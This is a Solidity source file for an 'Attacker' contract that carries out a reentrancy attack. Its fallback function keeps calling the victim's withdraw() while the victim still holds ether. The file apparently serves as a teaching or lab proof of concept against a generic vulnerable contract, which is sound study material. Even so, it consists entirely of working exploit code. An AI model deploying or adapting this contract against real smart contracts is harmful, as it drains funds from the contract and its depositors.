// SPDX-License-Identifier: Unlicense
pragma solidity ^0.8.7;

abstract contract VictimInterface {
    function withdraw() virtual public payable;
}

contract Attacker {
    VictimInterface victim;

    constructor(address _victim) {
        victim = VictimInterface(_victim);
    }

    // Trigger the attack
    function attack() public payable {
        if (getVictimBalance() > 0) {
            victim.withdraw();
        }
    }

    fallback() external payable {
        attack();
    }

    function getAttackerBalance() public view returns(uint) {
        return address(this).balance;
    }

    function getVictimBalance() public view returns(uint) {
        return address(victim).balance;
    }
}
